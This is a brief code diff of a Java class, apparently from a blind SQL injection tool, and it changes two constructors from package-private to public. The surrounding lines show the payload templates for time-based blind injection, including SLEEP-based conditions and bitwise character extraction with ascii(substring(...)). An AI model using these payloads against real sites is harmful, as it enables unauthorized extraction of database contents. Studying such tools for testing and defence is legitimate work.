@@ -30,7 +30,7 @@ public class TimeCallable extends AbstractBlindCallable {
      * Constructor for preparation and blind confirmation.
      * @param inj
      */
-    TimeCallable(String inj) {
+    public TimeCallable(String inj) {
         this.blindUrl = "+and+if(" + inj + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
     }
     
@@ -40,7 +40,7 @@ public class TimeCallable extends AbstractBlindCallable {
      * @param indexCharacter
      * @param bit
      */
-    TimeCallable(String inj, int indexCharacter, int bit) {
+    public TimeCallable(String inj, int indexCharacter, int bit) {
         this.blindUrl = "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
         this.currentIndex = indexCharacter;
         this.currentBit = bit;
